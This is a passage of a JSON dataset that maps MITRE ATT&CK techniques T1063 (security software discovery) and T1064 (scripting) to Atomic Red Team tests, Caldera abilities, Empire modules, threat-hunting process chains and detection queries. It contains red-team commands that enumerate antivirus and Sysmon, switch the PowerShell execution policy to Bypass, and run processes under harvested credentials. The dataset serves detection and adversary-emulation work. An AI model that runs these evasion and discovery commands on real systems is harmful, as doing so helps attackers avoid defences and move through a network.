"netsh.exe advfirewall  show allprofiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "ps -ef | grep Little\\ Snitch | grep -v grep\nps aux | grep CbOsxSensorService\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "fltmc.exe | findstr.exe 385201\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", "name": null}, {"source": "data/abilities/discovery/2dece965-37a0-4f70-a391-0f30e3331aba.yml", "command": {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, "name": "Identify AV"}, {"source": "data/abilities/discovery/8c06ebf8-bacf-486b-bd77-21ba8c5a5777.yml", "command": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "name": "Identify Firewalls"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/antivirusproduct", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/antivirusproduct", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> netsh advfirewall firewall show rule name = all\n\nRule Name: Network Discovery (UPnP-In)\n-------------------------------------------------- --------------------\nEnabled: Yes\nDirection: Inbound\nProfile: Dedicated\nGrouping: Network Discovery\nLocal IP: Any\nRemote IP: Any\nProtocol: TCP\nLocal Port: 2869\nRemote Port: Any\nEdge traversal: No\nAction: Allow", "name": "Dos"}], "parsed_datasets": [{"Atomic Red Team Test - Security Software Discovery": {"attack_technique": "T1063", "display_name": "Security Software Discovery", "atomic_tests": [{"name": "Security Software Discovery", "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "netsh.exe advfirewall  show allprofiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n"}}, {"name": "Security Software Discovery - powershell", "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n"}}, {"name": "Security Software Discovery - ps", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV software it is running( Little snitch or carbon black ).\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "elevation_required": false, "command": "ps -ef | grep Little\\ Snitch | grep -v grep\nps aux | grep CbOsxSensorService\n"}}, {"name": "Security Software Discovery - Sysmon Service", "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "fltmc.exe | findstr.exe 385201\n"}}, {"name": "Security Software Discovery - AV Discovery via WMI", "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"}}]}}, {"Mitre Stockpile - Identify AV": {"description": "Identify AV", "id": "2dece965-37a0-4f70-a391-0f30e3331aba", "name": "Discover antivirus programs", "platforms": {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, "tactic": "discovery", "technique": {"attack_id": "T1063", "name": "Security Software Discovery"}}}, {"Mitre Stockpile - Identify Firewalls": {"id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "name": "Identify Firewalls", "description": "Identify Firewalls", "tactic": "discovery", "technique": {"attack_id": "T1063", "name": "Security Software Discovery"}, "platforms": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/antivirusproduct", "ATT&CK Technique #1": "T1063", "ATT&CK Technique #2": "", "Technique": "Security Software Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/antivirusproduct\":  [\"T1063\"],"}}], "command_list": ["netsh.exe advfirewall  show allprofiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n", "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n", "ps -ef | grep Little\\ Snitch | grep -v grep\nps aux | grep CbOsxSensorService\n", "fltmc.exe | findstr.exe 385201\n", "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "powershell/situational_awareness/host/antivirusproduct", "powershell/situational_awareness/host/antivirusproduct", "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> netsh advfirewall firewall show rule name = all\n\nRule Name: Network Discovery (UPnP-In)\n-------------------------------------------------- --------------------\nEnabled: Yes\nDirection: Inbound\nProfile: Dedicated\nGrouping: Network Discovery\nLocal IP: Any\nRemote IP: Any\nProtocol: TCP\nLocal Port: 2869\nRemote Port: Any\nEdge traversal: No\nAction: Allow"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and(process_path contains \"netsh.exe\"or process_path contains \"reg.exe\"or process_path contains \"tasklist.exe\")and (process_command_line contains \"*reg* query*\"or process_command_line contains \"*tasklist *\"or process_command_line contains \"*netsh*\"or process_command_line contains \"*fltmc*|*findstr*\")", "name": "Security Software Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows executed locally netsh advfirewall firewall show rule name = all\ndescription: windows server 2016\nreferences: No\ntags: T1063\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ netsh.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: netsh advfirewall firewall show rule name = all # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1064", "commands": [{"source": "atomics/T1064/T1064.yaml", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n", "name": null}, {"source": "atomics/T1064/T1064.yaml", "command": "Start-Process #{script_path}\n", "name": null}, {"source": "atomics/T1064/T1064.yaml", "command": "Start-Process $env:TEMP\\T1064_script.bat\n", "name": null}, {"source": "data/abilities/defense-evasion/3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e.yml", "command": {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}, "name": "Ensure the ExecutionPolicy is turned to Bypass"}, {"source": "data/abilities/execution/3796a00b-b11d-4731-b4ca-275a07d83299.yml", "command": {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "name": "Run an application as a different user"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.jse", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.js", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vba", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbs", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "sh.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "bash.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "sh.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "bash.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "sh.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "bash.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "csc.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cvtres.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.jse", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.js", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vba", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbs", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "javaw.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "java.exe", "name": "sub_process_2"}, {"source": "SysmonHunter - Scripting", "command": "wscript.exe|cscript.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_metasploitpayload", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_metasploitpayload", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/invoke_script", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/invoke_script", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "Creates and executes a simple bash script.", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Scripting": {"attack_technique": "T1064", "display_name": "Scripting", "atomic_tests": [{"name": "Create and Execute Bash Shell Script", "description": "Creates and executes a simple bash script.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "elevation_required": false, "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n"}}, {"name": "Create and Execute Batch Script", "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launh to run the batch script then close again.\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Command to execute within script.", "type": "string", "default": "dir"}, "script_path": {"description": "Path of script to create.", "type": "path", "default": "$env:TEMP\\T1064_script.bat"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Batch file must exist on disk at specified location (#{script_path})\n", "prereq_command": "if (Test-Path #{script_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item #{script_path} -Force | Out-Null\nSet-Content -Path #{script_path} -Value \"#{command_to_execute}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Start-Process #{script_path}\n", "cleanup_command": "Remove-Item #{script_path} -Force -ErrorAction Ignore\n"}}]}}, {"Mitre Stockpile - Ensure the ExecutionPolicy is turned to Bypass": {"id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e", "name": "Bypass ExecutionPolicy", "description": "Ensure the ExecutionPolicy is turned to Bypass", "tactic": "defense-evasion", "technique": {"attack_id": "T1064", "name": "Scripting"}, "platforms": {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}}}, {"Mitre Stockpile - Run an application as a different user": {"id": "3796a00b-b11d-4731-b4ca-275a07d83299", "name": "Impersonate user", "description": "Run an application as a different user", "tactic": "execution", "technique": {"attack_id": "T1064", "name": "Scripting"}, "platforms": {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "host.user.name", "edge": "has_password", "target": "host.user.password"}]}]}}, {"Threat Hunting Tables": {"chain_id": "100016", "os": "windows", "parent_process": "cscript.exe", "commandline_string": "", "sub_process_1": "*.jse", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"}}, {"Threat Hunting Tables": {"chain_id": "100017", "os": "windows", "parent_process": "cscript.exe", "commandline_string": "", "sub_process_1": "*.vbe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"}}, {"Threat Hunting Tables": {"chain_id": "100018", "os": "windows", "parent_process": "cscript.exe", "commandline_string": "", "sub_process_1": "*.js", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "4bcc2af66d843614f1a8ef0daeb1987c08ff6a5c4a9930f9307f65b07f0888bd"}}, {"Threat Hunting Tables": {"chain_id": "100019", "os": "windows", "parent_process": "cscript.exe", "commandline_string": "", "sub_process_1": "*.vba", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"}}, {"Threat Hunting Tables": {"chain_id": "100020", "os": "windows", "parent_process": "cscript.exe", "commandline_string": "", "sub_process_1": "*.vbs", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "9feb89d55680071ce79f32529591bd3d51536f9e08672cb79d0ab81b57cf905d"}}, {"Threat Hunting Tables": {"chain_id": "100026", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100027", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "cscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100028", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "wscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "powershell", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100030", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "sh.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100031", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "bash.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100043", "os": "windows", "parent_process": "mshta.exe", "commandline_string": "", "sub_process_1": "cscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "6707264f01730f55c79379d75d29000fb44c92de99b8a1d58588e05963f3dea6"}}, {"Threat Hunting Tables": {"chain_id": "100044", "os": "windows", "parent_process": "mshta.exe", "commandline_string": "", "sub_process_1": "wscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "aab57e55b04eb09ef97c7bc0c79d5c0ffeda557c7333777cd178adced03676cc"}}, {"Threat Hunting Tables": {"chain_id": "100057", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100058", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "cscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100059", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "wscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100061", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "sh.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100062", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "bash.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100088", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "powershell", "mitre_attack": "T1064", "itw_sample": "1d20934083558bc5a23e57b4f14ec1147f19d23807e8956714b256ae64f9692c"}}, {"Threat Hunting Tables": {"chain_id": "100089", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100090", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "cscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100091", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "wscript.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100093", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "sh.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100094", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "bash.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100097", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "csc.exe", "sub_process_2": "cvtres.exe", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "947ce5214919e4395a2454375972d37756e1162890c62b0bb30e2a4be9ddaf54"}}, {"Threat Hunting Tables": {"chain_id": "100103", "os": "windows", "parent_process": "wscript.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100104", "os": "windows", "parent_process": "wscript.exe", "commandline_string": "", "sub_process_1": "*.jse", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, 